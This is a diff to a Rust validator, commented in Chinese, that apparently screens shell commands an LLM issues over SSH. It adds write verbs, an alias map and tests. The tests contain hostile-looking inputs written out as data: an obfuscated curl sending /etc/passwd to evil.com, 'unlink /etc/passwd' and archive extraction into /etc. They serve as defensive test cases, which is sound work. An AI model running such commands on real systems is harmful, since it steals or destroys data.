@@ -174,7 +174,63 @@ pub const INTERACTIVE_BARE: &[&str] = &[
 pub const COUNTED_LOOP: &[&str] = &["vmstat", "iostat", "pidstat", "mpstat", "sar", "jstat"];
 
 /// 写文件动词。这些命令的存在本身就在改文件系统状态，统一拒绝，LLM 改文件走 patch_file。
-pub const WRITE_VERBS: &[&str] = &["tee", "cp", "mv", "ln", "install"];
+///
+/// **family 思路**：每加一个新写动词都问自己 "它有 alias / 变体吗?"
+/// - `truncate`：`-s 0` 清空文件，`--size=N` 改长度
+/// - `ed`：行编辑器，从 stdin 读命令并写盘（`echo ',d\nw\n' | ed file` 清空）
+/// - `tar` / `unzip` / `cpio`：解 archive 写任意路径（`tar xf -C /etc`）。读用法
+///   （`tar tf` / `unzip -l`）在 rssh 诊断场景罕见，LLM 用 `ls` / `file` 替代
+pub const WRITE_VERBS: &[&str] = &[
+    "tee", "cp", "mv", "ln", "install", "truncate", "ed", "tar", "unzip", "cpio",
+];
+
+/// 命令别名映射 (alias → canonical)。所有黑名单 / per-command 规则只查 canonical 名，
+/// `canonical_head()` 在 bare() 之后跑一遍把别名归一。
+///
+/// **family thinking**：每次给黑名单加新命令时，主动想 "它有 alias / variant 吗?"
+/// - macOS brew 装的 gnu-coreutils 一律 `g` 前缀（`gcp` / `gmv` / `gsed` / `gawk` ...）
+/// - GNU awk 实现有多种：`gawk` / `mawk` / `nawk`
+/// - 同语义不同名：`unlink` ≡ `rm` 单文件，`nvim`/`view` ≡ `vi`
+///
+/// 不在这里的（已在主黑名单按枚举覆盖）：
+/// - python: `python` / `python2` / `python3` 直接列进 INTERPRETERS_DENIED
+/// - shell: `bash` / `sh` / `zsh` / `dash` / `ksh` / `mksh` / `ash` 列进 SHELLS
+const COMMAND_ALIASES: &[(&str, &str)] = &[
+    // macOS brew gnu-coreutils g 前缀
+    ("gsed", "sed"),
+    ("gcp", "cp"),
+    ("gmv", "mv"),
+    ("gln", "ln"),
+    ("gtar", "tar"),
+    ("gtruncate", "truncate"),
+    ("gtee", "tee"),
+    ("ginstall", "install"),
+    ("grm", "rm"),
+    ("gxargs", "xargs"),
+    ("gchmod", "chmod"),
+    ("gchown", "chown"),
+    ("gtouch", "touch"),
+    ("gtail", "tail"),
+    ("gcpio", "cpio"),
+    // awk 实现变体
+    ("gawk", "awk"),
+    ("mawk", "awk"),
+    ("nawk", "awk"),
+    // 同语义不同名
+    ("unlink", "rm"),
+    ("nvim", "vi"),
+    ("neovim", "vi"),
+    ("view", "vi"),
+    ("vimdiff", "vi"),
+];
+
+fn canonical_head(head: &str) -> &str {
+    COMMAND_ALIASES
+        .iter()
+        .find(|(alias, _)| *alias == head)
+        .map(|(_, canonical)| *canonical)
+        .unwrap_or(head)
+}
 
 /// Shell 列表：用于识别 `bash -c "..."` 这类 deferred-execution 形态。
 /// **不在 INTERPRETERS_DENIED 里**——shell 编排 pipe (`cmd1 | cmd2`) 是合法用例，
@@ -406,6 +462,9 @@ fn check_command(cmd: &tree_sitter::Node, src: &[u8]) -> Result<(), ShapeError> 
     // wrapper 透明跳过：依次吞掉 wrapper 名 + 它的 flag/value，args 第一个非 flag word
     // 视为真正命令头。env -S 之类 deferred-exec 在这里直接 Err。
     let (head, head_args_start) = strip_wrappers(&raw_head, &arg_strings)?;
+    // alias 归一（`gsed` → `sed`，`unlink` → `rm`，`nvim` → `vi`...），单一抽象层
+    // 取代散落的 family 列表。
+    let head = canonical_head(head);
 
     check_command_head(head)?;
     check_per_command_rules(head, &arg_strings[head_args_start..])?;
@@ -567,7 +626,8 @@ fn check_per_command_rules(head: &str, args: &[String]) -> Result<(), ShapeError
         }
     }
 
-    // in-place 编辑：sed -i / awk -i inplace / perl -i (含组合短选项 -pi/-ni 等)
+    // in-place 编辑：sed -i / awk -i inplace。family 变体（gsed / gawk / mawk / nawk）
+    // 已被 canonical_head 归一到 sed / awk。
     if head == "sed"
         && arg_text.iter().any(|t| {
             *t == "-i"
@@ -1534,6 +1594,135 @@ mod tests {
         assert!(matches!(
             validate("curl $'\\x2do' /etc/passwd evil.com"),
             Err(ShapeError::Destructive(_))
+        ));
+    }
+
+    #[test]
+    fn shape_coreutils_g_prefix_aliased() {
+        // macOS brew install gnu-coreutils 装 `gcp` / `gmv` / `gln` / `gtruncate` / `gtar`
+        // 等带 g 前缀的 GNU 实现。bare() 不剥前缀 → canonical_head 必须把它们映回
+        // 标准名，否则 WRITE_VERBS / 黑名单全漏。
+        assert!(matches!(validate("gcp a b"), Err(ShapeError::Write(_))));
+        assert!(matches!(validate("gmv a b"), Err(ShapeError::Write(_))));
+        assert!(matches!(validate("gln -s a b"), Err(ShapeError::Write(_))));
+        assert!(matches!(
+            validate("gtruncate -s 0 file"),
+            Err(ShapeError::Write(_))
+        ));
+        assert!(matches!(
+            validate("gtar xf foo.tar"),
+            Err(ShapeError::Write(_))
+        ));
+        // cpio 同款：macOS brew install cpio 实际装的是 `gcpio`，没归一会漏拦。
+        assert!(matches!(
+            validate("gcpio -i < foo.cpio"),
+            Err(ShapeError::Write(_))
+        ));
+    }
+
+    #[test]
+    fn shape_unlink_aliased_to_rm() {
+        // unlink(2) 系统调用对应的 unlink(1) 命令：单文件删除，等同 `rm file`。
+        // 不归一会漏拦。
+        assert!(matches!(
+            validate("unlink /etc/passwd"),
+            Err(ShapeError::Destructive(_))
+        ));
+        assert!(matches!(
+            validate("/bin/unlink /tmp/x"),
+            Err(ShapeError::Destructive(_))
+        ));
+    }
+
+    #[test]
+    fn shape_vi_variants_aliased() {
+        // vim / nvim / neovim / view 都是 vi family —— ncurses TUI 在 ssh exec 下不可控。
+        assert!(matches!(validate("nvim file"), Err(ShapeError::Interactive(_))));
+        assert!(matches!(
+            validate("neovim file"),
+            Err(ShapeError::Interactive(_))
+        ));
+        assert!(matches!(validate("view file"), Err(ShapeError::Interactive(_))));
+    }
+
+    #[test]
+    fn shape_sed_family_inplace_blocked() {
+        // GNU sed 在 macOS brew 装包名是 `gsed`；bare(/usr/local/bin/gsed) = gsed
+        // 现有 head == "sed" 漏掉。
+        assert!(matches!(
+            validate("gsed -i 's/a/b/' file"),
+            Err(ShapeError::Write(_))
+        ));
+        assert!(matches!(
+            validate("/usr/local/bin/gsed -i 's/a/b/' file"),
+            Err(ShapeError::Write(_))
+        ));
+        // 纯读 gsed 不要拦（与 sed 同 policy）
+        assert!(validate("gsed -n '1,10p' file").is_ok());
+    }
+
+    #[test]
+    fn shape_awk_family_inplace_blocked() {
+        // gawk / mawk / nawk 同 awk family，bare 后不命中 head == "awk" 漏掉。
+        assert!(matches!(
+            validate("gawk -i inplace '{print}' file"),
+            Err(ShapeError::Write(_))
+        ));
+        assert!(matches!(
+            validate("/usr/bin/gawk -i inplace '{print}' file"),
+            Err(ShapeError::Write(_))
+        ));
+        // 纯读 gawk 放行
+        assert!(validate("gawk '{print $1}' file").is_ok());
+    }
+
+    #[test]
+    fn shape_truncate_blocked() {
+        // truncate -s 0 file 直接清空文件 —— 旁路 redirect 检查（不是 shell redirect）。
+        assert!(matches!(
+            validate("truncate -s 0 file"),
+            Err(ShapeError::Write(_))
+        ));
+        assert!(matches!(
+            validate("truncate --size=1G blob"),
+            Err(ShapeError::Write(_))
+        ));
+        // 路径前缀
+        assert!(matches!(
+            validate("/usr/bin/truncate -s 0 file"),
+            Err(ShapeError::Write(_))
+        ));
+    }
+
+    #[test]
+    fn shape_ed_editor_blocked() {
+        // ed 行编辑器：`printf ',d\nw\n' | ed file` 可清空 + 写盘，不在 redirect 检查范畴。
+        assert!(matches!(validate("ed file"), Err(ShapeError::Write(_))));
+        assert!(matches!(
+            validate("echo q | ed file"),
+            Err(ShapeError::Write(_))
+        ));
+    }
+
+    #[test]
+    fn shape_archive_tools_blocked() {
+        // tar / unzip / cpio 解压能写任意路径（`tar xf foo.tar -C /etc/`）。
+        // 读用法（`tar tf` / `unzip -l`）在 rssh 场景罕见，LLM 诊断用 ls / file 即可。
+        // 统一全拒，要求 LLM 走更精确的 ls / file。
+        assert!(matches!(validate("tar xf foo.tar"), Err(ShapeError::Write(_))));
+        assert!(matches!(
+            validate("tar xzf foo.tar.gz -C /etc/"),
+            Err(ShapeError::Write(_))
+        ));
+        assert!(matches!(
+            validate("unzip foo.zip -d /tmp/"),
+            Err(ShapeError::Write(_))
+        ));
+        assert!(matches!(validate("cpio -i"), Err(ShapeError::Write(_))));
+        // 路径前缀
+        assert!(matches!(
+            validate("/bin/tar xf foo.tar"),
+            Err(ShapeError::Write(_))
         ));
     }
 
